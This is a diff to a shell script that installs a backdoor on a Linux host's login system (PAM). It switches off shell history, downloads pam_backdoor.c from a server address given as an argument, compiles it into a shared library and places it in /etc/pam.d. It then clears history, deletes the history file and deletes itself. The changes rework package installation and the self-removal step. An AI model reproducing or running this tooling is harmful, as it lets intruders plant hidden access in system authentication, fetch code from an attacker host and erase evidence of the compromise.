@@ -3,6 +3,8 @@
 set +e
 set +o history
 
+CWD=$(pwd)
+
 # Validate input
 if [ $# -ne 1 ]; then
     echo "Usage: $0 <server_ip:port>"
@@ -20,11 +22,16 @@ fi
 PKG_MANAGER=""
 if command -v apt &>/dev/null; then
     PKG_MANAGER="apt install -y"
-    sudo apt update
+    $PKG_MANAGER libpam0g-dev gcc make build-essential
+    apt update
 elif command -v yum &>/dev/null; then
     PKG_MANAGER="yum install -y"
+    yum update
+    $PKG_MANAGER pam-devel gcc
 elif command -v dnf &>/dev/null; then
     PKG_MANAGER="dnf install -y"
+    dnf update
+    $PKG_MANAGER pam-devel gcc
 elif command -v pacman &>/dev/null; then
     PKG_MANAGER="pacman -S --noconfirm"
 else
@@ -37,7 +44,7 @@ cd /var/opt/bds
 
 # Backdoor PAM
 $FETCH_CMD $SERV_IP_PORT/pam_backdoor.c
-$PKG_MANAGER libpam0g-dev gcc
+
 gcc -fPIC -shared -o bds_pam.so pam_backdoor.c
 mv bds_pam.so /etc/pam.d
 
@@ -167,4 +174,5 @@ history -c
 rm -f $HISTFILE
 
 # Delete script
-rm -- "$0"
+cd "$CWD"
+rm -f "$0"
